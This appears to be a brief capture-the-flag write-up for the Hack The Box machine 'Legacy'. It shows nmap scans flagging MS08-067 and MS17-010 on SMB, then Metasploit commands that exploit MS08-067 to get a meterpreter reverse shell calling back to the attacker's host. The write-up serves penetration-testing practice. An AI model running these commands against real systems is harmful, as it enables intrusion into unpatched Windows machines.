---
description: One of the first few boxes I've done!
---

# Legacy

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.242
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 09:20 EDT
Nmap scan report for 10.129.85.242
Host is up (0.076s latency).
Not shown: 61445 closed tcp ports (conn-refused), 4087 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

This was an outdated machine, so there was bound to be some vulnerabilities with the SMB service. We can run some `nmap` scripts to determine this:

```
$ sudo nmap --script smb-vuln* -p 445 10.129.85.242 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 09:22 EDT
Nmap scan report for 10.129.85.242
Host is up (0.0060s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
We
Nmap done: 1 IP address (1 host up) scanned in 5.34 seconds
```

So this was vulnerable to MS08-067. We can use `msfconsole` to exploit this.&#x20;

```
use exploit/windows/smb/ms08_067_netapi
set LHOST 10.10.14.13
set RHOSTS 10.129.85.242
exploit
```

This would give us a meterpreter shell.

<figure><img src="../../../.gitbook/assets/image (2463).png" alt=""><figcaption></figcaption></figure>

For some reason, `whoami` does not work on the machine. We can use the `whoami.exe` binary that is within Kali at `/usr/share/windows-resources/binaries` and run it via SMB.

<figure><img src="../../../.gitbook/assets/image (658).png" alt=""><figcaption></figcaption></figure>

Rooted!&#x20;
